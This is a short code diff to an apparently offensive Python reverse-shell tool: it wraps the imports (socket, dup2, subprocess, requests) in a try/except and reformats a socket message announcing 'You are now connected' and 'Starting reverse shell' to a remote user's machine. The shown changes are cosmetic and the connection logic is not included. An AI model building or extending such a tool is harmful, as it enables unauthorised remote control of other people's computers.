@@ -1,11 +1,14 @@
 #!/usr/bin/env python3
 
-import time
-from subprocess import run
-from os import dup2
-import socket
-import os
-import requests
+try:
+    import time
+    from subprocess import run
+    from os import dup2
+    import socket
+    import os
+    import requests
+except ImportError:
+    raise RuntimeError("Important modules are missing!")
 
 
 # # # # # # # # # # # # # # # # # # # # # #
@@ -48,7 +51,8 @@ class Shell:
 
             time.sleep(1.75)
 
-            socket_sock.send(f"\n\033[0;37m[\033[0;31m+\033[0;37m] You are now connected".encode() +
+            socket_sock.send(
+                f"\n\033[0;37m[\033[0;31m+\033[0;37m] You are now connected".encode() +
                 f" to {self.remote_username}'s machine {self.remote_hostname} ".encode()
             )
             socket_sock.send(f"\n\033[0;37m[\033[0;31m+\033[0;37m] Starting reverse shell to {self.remote_hostname} ...".encode())
